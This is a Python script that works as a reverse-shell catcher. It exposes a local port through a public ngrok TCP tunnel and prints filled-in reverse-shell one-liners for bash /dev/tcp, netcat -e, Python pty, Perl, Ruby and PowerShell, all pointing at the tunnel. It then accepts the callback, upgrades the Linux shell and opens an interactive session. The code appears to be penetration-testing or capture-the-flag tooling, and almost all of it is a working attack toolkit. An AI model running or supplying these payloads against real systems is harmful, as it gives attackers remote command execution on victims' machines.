#!/usr/bin/env python3

import ngrok
import os
import subprocess
import sys
import signal
import atexit

from dotenv import load_dotenv
from pwnlib.tubes.listen import listen
from time import sleep


SUPPORTED_SHELLS = [
    "sh",
    "/bin/sh",
    "bash",
    "/bin/bash",
    "cmd",
    "powershell",
    "pwsh",
    "ash",
    "bsh",
    "csh",
    "ksh",
    "zsh",
    "pdksh",
    "tcsh",
    "mksh",
    "dash",
    "fish",
]


# Color codes for output
class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"


def colored_print(text: str, color: str = Colors.WHITE):
    """Print text with color"""
    print(f"{color}{text}{Colors.END}")


def execute(conn: listen, cmd: str):
    """Execute a command on the remote connection"""
    conn.sendline(cmd.encode())
    print(conn.recvline().decode())
    sleep(0.1)


def parse_arguments() -> tuple[int, str, bool, bool]:
    """Parse command line arguments"""
    is_linux = False
    is_windows = False
    shell = "bash"

    try:
        port = int(sys.argv[1])

        # Validate port range
        if not (1 <= port <= 65535):
            colored_print(f"Port must be between 1 and 65535, got: {port}", Colors.RED)
            raise ValueError

        if len(sys.argv) > 2:
            shell = sys.argv[2].lower()
            if shell in ("powershell", "pwsh", "cmd"):
                shell = "powershell" if shell == "pwsh" else shell
                is_windows = True
            elif shell in SUPPORTED_SHELLS:
                is_linux = True
            else:
                colored_print(f"Unsupported shell: {shell}", Colors.RED)
                print()
                raise ValueError
    except (IndexError, ValueError):
        colored_print(f"USAGE: {sys.argv[0]} <PORT> [SHELL]", Colors.YELLOW)
        colored_print(
            "  - A valid NGROK_AUTHTOKEN must be set in the environment", Colors.WHITE
        )
        colored_print(
            "  - SHELL can optionally be set for the revshell examples, defaults to bash",
            Colors.WHITE,
        )
        colored_print(
            f"    - Supported shells: {', '.join(SUPPORTED_SHELLS)}", Colors.WHITE
        )
        colored_print(
            "    - For Windows, set SHELL to powershell/pwsh/cmd", Colors.WHITE
        )
        print()
        exit()

    return port, shell, is_linux, is_windows


def check_ngrok_auth() -> bool:
    """Check if ngrok auth token is available"""
    load_dotenv()
    if not os.getenv("NGROK_AUTHTOKEN"):
        colored_print("No NGROK_AUTHTOKEN set in environment - options:", Colors.RED)
        colored_print(
            '  - Add a .env file with "NGROK_AUTHTOKEN=<your-token>"', Colors.WHITE
        )
        colored_print(
            '  - Set with "export NGROK_AUTHTOKEN=<your-token>" before running',
            Colors.WHITE,
        )
        colored_print(
            f'  - Run the script as "NGROK_AUTHTOKEN=<your-token> python {" ".join(sys.argv)}"',
            Colors.WHITE,
        )
        print()
        return False

    return True


def setup_ngrok_tunnel(port: int) -> tuple[ngrok.Listener, str, int, str]:
    """Set up ngrok tunnel and return connection details"""
    if check_ngrok_auth():
        colored_print("[+] Setting up ngrok tunnel...", Colors.BLUE)

    try:
        public_listener = ngrok.forward(port, authtoken_from_env=True, proto="tcp")
    except Exception as err:
        colored_print(f"[!] Error setting up ngrok tunnel: {err.args[-1]}", Colors.RED)
        for line in err.args[1:-1]:
            colored_print(line, Colors.WHITE)
        exit()

    url = public_listener.url()
    hostname, public_port = url.replace("tcp://", "").split(":")

    # Lookup IP of hostname with fallback
    try:
        ip = (
            subprocess.check_output(("getent", "ahostsv4", hostname))
            .split()[0]
            .decode()
        )
    except subprocess.CalledProcessError:
        # Fallback if getent fails (e.g., on some systems)
        colored_print(
            f"[!] Could not resolve IP for {hostname}, using hostname", Colors.YELLOW
        )
        ip = hostname

    return public_listener, ip, int(public_port), hostname


def print_revshell_examples(
    ip: str, public_port: int, shell: str, is_linux: bool, is_windows: bool
):
    """Print reverse shell examples"""
    colored_print(
        "=============== REVSHELL EXAMPLES ===============", Colors.BOLD + Colors.PURPLE
    )
    print()

    if not is_windows:
        colored_print("Bash:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(f"bash -i >& /dev/tcp/{ip}/{public_port} 0>&1", Colors.YELLOW)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        print()

    colored_print("Netcat:", Colors.CYAN)
    colored_print("────────────────────────────────────────────", Colors.WHITE)
    colored_print(
        f"nc{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}", Colors.YELLOW
    )
    colored_print(
        f"ncat{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}",
        Colors.YELLOW,
    )
    colored_print("────────────────────────────────────────────", Colors.WHITE)
    print()

    if not is_windows:
        colored_print("Python:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{public_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        print()

        colored_print("Perl:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""perl -e 'use Socket;$i="{ip}";$p={public_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        print()

        colored_print("Ruby:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{public_port}))'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        print()

    if not is_linux:
        colored_print("PowerShell:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{public_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". {{ $data }} 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        print()

    colored_print("See more examples at https://www.revshells.com/", Colors.CYAN)
    print()
    colored_print(
        "=================================================", Colors.BOLD + Colors.PURPLE
    )
    print()


def upgrade_linux_shell(conn: listen):
    """Upgrade Linux shell with QoL improvements"""
    colored_print("[+] Trying to upgrade shell...", Colors.BLUE)

    # Try different Python versions for PTY upgrade
    python_commands = [
        """python3 -c 'import pty; pty.spawn("/bin/bash")'""",
        """python -c 'import pty; pty.spawn("/bin/bash")'""",
        """python3 -c 'import pty; pty.spawn("/bin/sh")'""",
        """python -c 'import pty; pty.spawn("/bin/sh")'""",
    ]

    upgrade_successful = False
    for cmd in python_commands:
        try:
            execute(conn, cmd)
            upgrade_successful = True
            break
        except Exception as _err:
            continue

    if not upgrade_successful:
        colored_print("[!] Could not upgrade shell with PTY", Colors.YELLOW)

    # Set up shell improvements
    execute(conn, "alias ls='ls -lha --color=auto'")
    execute(conn, "export SHELL=bash")
    execute(conn, "export TERM=xterm-256color")

    # Get local stty rows and cols and set remote
    try:
        stty = subprocess.check_output(["stty", "-a"]).decode().split("; ")
        rows, cols = stty[1][5:], stty[2][8:]
        execute(conn, f"stty rows {rows} cols {cols}")
    except (subprocess.CalledProcessError, IndexError):
        colored_print("[!] Could not get terminal dimensions", Colors.YELLOW)


def cleanup_ngrok(public_listener: ngrok.Listener):
    """Clean up ngrok tunnel"""
    try:
        ngrok.disconnect(public_listener.url())
        colored_print("\n[+] Ngrok tunnel closed", Colors.GREEN)
    except Exception as e:
        colored_print(f"[!] Error closing ngrok tunnel: {e}", Colors.RED)


def signal_handler(_signum: int, _frame):
    """Handle interrupt signals"""
    colored_print("\n[!] Interrupted! Cleaning up...", Colors.YELLOW)
    sys.exit(0)


def main():
    # Set up signal handlers for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    port, shell, is_linux, is_windows = parse_arguments()
    public_listener, ip, public_port, hostname = setup_ngrok_tunnel(port)

    # Register cleanup function for ngrok listener
    atexit.register(lambda: cleanup_ngrok(public_listener))

    colored_print(f"[+] Listening at {ip}:{public_port} ({hostname})...", Colors.GREEN)
    print()
    print_revshell_examples(ip, public_port, shell, is_linux, is_windows)

    colored_print("[+] Waiting for connection...", Colors.BLUE)
    colored_print("    Press Ctrl+C to exit", Colors.CYAN)

    try:
        conn = listen(port).wait_for_connection()
        colored_print("[+] Connection received!", Colors.GREEN)

        if is_linux:
            upgrade_linux_shell(conn)
        elif is_windows:
            conn.sendline(b"")

        conn.interactive()
    except KeyboardInterrupt:
        colored_print("\n[!] Interrupted by user", Colors.YELLOW)
    except Exception as e:
        colored_print(f"\n[!] Unexpected error: {e}", Colors.RED)


if __name__ == "__main__":
    main()
